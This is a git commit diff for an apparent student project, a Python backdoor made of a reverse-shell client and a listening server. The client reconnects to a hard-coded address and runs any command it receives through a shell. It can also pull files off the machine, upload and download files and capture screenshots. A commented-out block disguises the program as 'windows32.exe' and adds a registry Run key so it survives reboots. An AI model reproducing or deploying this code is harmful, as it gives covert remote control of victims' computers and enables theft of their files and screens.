a08c2940c292905f01505103c00e042d087ee71c
NguyenMinhDucIT <ducc.minh.ngn@gmail.com>
2022-12-11 17:34:04 +0700

    Update 11/12: Added many function (download, upload, get, screenshot-still error). Problem occur: problem in python mss related to X11 and Wayland

--- backdoor/reverse_shell.py
+++ backdoor/reverse_shell.py
@@ -3,41 +3,115 @@
 import socket
 import subprocess as sp
 import json
+import os
+import base64
+import sys
+import shutil
+import requests
+import time
+from mss import mss
 
 
+# CHECK AGAIN DATA TYPES IN THIS SEND FUNCTION (BYTES OR STRING)
+# Sending data
 def reliable_send(data):
-	json_data = json.dumps(data.decode('utf-8')) # decode from bytes to work with JSON
-	s.send(json_data.encode('utf-8')) # encoding data to send 
+    if isinstance(data, bytes):
+        json_data = json.dumps(data.decode('utf-8')) # decode from bytes to work with JSON
+    else:
+        json_data = json.dumps(data)
 
+    s.send(json_data.encode('utf-8')) # encoding data to send 
 
+# Receiving data
 def reliable_recv():
-	data = ""
-	while True:
-		try:
-			data = data + s.recv(1024).decode('utf-8') # decode to concatenate string
-			return json.loads(data)
-		except ValueError:
-			continue
+    data = ""
+    while True:
+        try:
+            data = data + s.recv(1024).decode('utf-8') # decode to concatenate string
+            return json.loads(data)
+        except ValueError:
+            continue
 
 
+# Checking for connection every x seconds
+def connection():
+    while True:
+        time.sleep(10)
+        try:
+            s.connect(("192.168.235.132", 2345))
+            shell()
+        except:
+            connection()
+
+
+# Download file from web
+def download(url):
+    res = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb") as f:
+        f.write(res.content)
+
+# Taking screeshot
+def screenshot():
+    with mss() as screenshot:
+        screenshot.shot()
+
+# Backbone function
 def shell():
-	while True:
-		# command = reliable_recv().decode('utf-8') # ?need decode ???
-		command = reliable_recv() # answer line 25: nope because data is already decoded in the reliable_recv function
-		
-		# Use b'q' because the command variable is a byte type after receiving from the server' --> Just use decode :))
-		if command == 'q':
-			break
-		else:
-			proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
-			result = proc.stdout.read() + proc.stderr.read() # Apparently the data return from proc or maybe function read() from subprocess is already returned as bytes :))
+    while True:
+        # command = reliable_recv().decode('utf-8') # ?need decode ???
+        command = reliable_recv() # answer line 25: nope because data is already decoded in the reliable_recv function
+        
+        # Use b'q' because the command variable is a byte type after receiving from the server' --> Just use decode :))
+        if command == 'q':
+            break
+        elif command[:2] == "cd" and len(command) > 1:
+            try:
+                os.chdir(command[3:])
+            except:
+                continue
+        # Server sent download means client read and send file's data
+        elif command[:8] == "download":
+            with open(command[9:], 'rb') as f:
+                reliable_send(base64.b64encode(f.read()))
 
-			reliable_send(result)
+        # Server sent upload means client receives and writes data to file
+        elif command[:6] == "upload":
+            with open(command[7:], 'wb') as f:
+                data = reliable_recv()
+                f.write(base64.b64decode(data))
+            
+        # Download file from web
+        elif command[:3] == "get":
+            try:
+                download(command[4:])
+                reliable_send("[+] File Downloaded from URL!")
+            except:
+                reliable_send("[-] File Failed to Download ...")
+        
+        # Taking screenshot
+        elif command[:10] == "screenshot":
+            try: 
+                screenshot()
+                with open("monitor.png", "rb") as f:
+                    reliable_send(base64.b64encode(f.read()))
+                os.remove("monitor.png")
+            except: 
+                reliable_send("[-] Failed to take screenshot!")
+        else:
+            proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
+            result = proc.stdout.read() + proc.stderr.read() # Apparently the data return from proc or maybe function read() from subprocess is already returned as bytes :))
+
+            reliable_send(result)
+
+# Code for hiding backdoor and being persistent (does not require yet!!!)
+# location = os.environ["AppData"] + "\\windows32.exe"
+# if not os.path.exists(location):
+#   shutil.copyfile(sys.executable, location)
+#   subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.connect(("192.168.235.132", 1234))
-
-shell()
-
+connection()
 s.close()
--- backdoor/server.py
+++ backdoor/server.py
@@ -3,58 +3,94 @@
 import socket
 from termcolor import colored
 import json
+import base64
 
 
 
 def reliable_send(data):
-	json_data = json.dumps(data) 
-	target.send(json_data.encode('utf-8')) # HERE IS WHERE THE DATA IS ENCODED TO SEND THROUGH SOCKET
+    json_data = json.dumps(data) 
+    target.send(json_data.encode('utf-8')) # HERE IS WHERE THE DATA IS ENCODED TO SEND THROUGH SOCKET
 
 
 def reliable_recv():
-	data = ""
-	while True:
-		try:
-			data = data + target.recv(1024).decode('utf-8') # HERE IS WHERE DATA RECV DECODED FOR JSON MANIPULATION
-			return json.loads(data)
-		except ValueError:
-			continue
+    data = ""
+    while True:
+        try:
+            data = data + target.recv(1024).decode('utf-8') # HERE IS WHERE DATA RECV DECODED FOR JSON MANIPULATION
+            return json.loads(data)
+        except ValueError:
+            continue
 
 
 def shell():
-	while True:
-		command = input(f"*HeartShell-{str(ip)}#: ") # data type String
-		# reliable_send(command.encode('utf-8')) # already dumps by json (? data type) --> need convert??
-		reliable_send(command) 	# answer line 27: no convert --> JSON doesn't apply to bytes
-		# End shell session
-		if command == 'q':
-			break
-		else:
-			# result = target.recv(1024) # data type Bytes
-			result = reliable_recv() # need decode??? --> nope, already decode in the function
-			print(result)
+    global count
+    while True:
+        command = input(f"*HeartShell-{str(ip)}#: ") # data type String
+        # reliable_send(command.encode('utf-8')) # already dumps by json (? data type) --> need convert??
+        reliable_send(command)  # answer line 27: no convert --> JSON doesn't apply to bytes
+        # End shell session
+        if command == 'q':
+            break
+        elif command[:2] == "cd" and len(command) > 1:
+            continue
+
+        # Download File
+        elif command[:8] == "download":
+            with open(command[9:], 'wb') as f:
+                file_content = reliable_recv()
+                # f.write(base64.b64decode(file_content).decode('utf-8'))
+                f.write(base64.b64decode(file_content))
+
+        # Upload file
+        elif command[:6] == "upload":
+            try:
+                with open(command[7:], 'rb') as f:
+                    file_content = base64.b64encode(f.read()) 
+                    reliable_send(file_content.decode('utf-8'))
+            except:
+                failed = b"Upload Failed!"      # Base64 encode works with bytes
+                reliable_send(base64.b64encode(failed).decode('utf-8'))
+        
+        # Screenshot bot monitor
+        elif command[:10] == "screenshot":
+            with open(f"screenshot-{count}", "wb") as f:
+                image = reliable_recv()
+                
+                image_decoded = base64.b64decode(image)
+
+                # if image[:3] == "[-]":
+                print(image_decoded)
+                # else:
+                #     f.write(image_decoded)
+                count += 1
+        else:
+            # result = target.recv(1024) # data type Bytes
+            result = reliable_recv() # need decode??? --> nope, already decode in the function
+            print(result)
 
 def server():
-	# Creating global variables so that can be used in different functions
-	global s
-	global target
-	global ip
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    # Creating global variables so that can be used in different functions
+    global s
+    global target
+    global ip
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-	host = '0.0.0.0'
-	port = 1234
+    host = '0.0.0.0'
+    port = 2345
 
-	s.bind((host, port))
-	s.listen(5)
 
-	print(colored("[+] Listening for incoming connection ...", 'green'))
+    s.bind((host, port))
+    s.listen(5)
 
-	target, ip = s.accept()
+    print(colored("[+] Listening for incoming connection ...", 'green'))
 
-	print(colored(f"[+] Connection established from: {str(ip)}", 'green'))
+    target, ip = s.accept()
 
-	s.close()
+    print(colored(f"[+] Connection established from: {str(ip)}", 'green'))
 
+    s.close()
+
+count = 0
 server()
 shell()
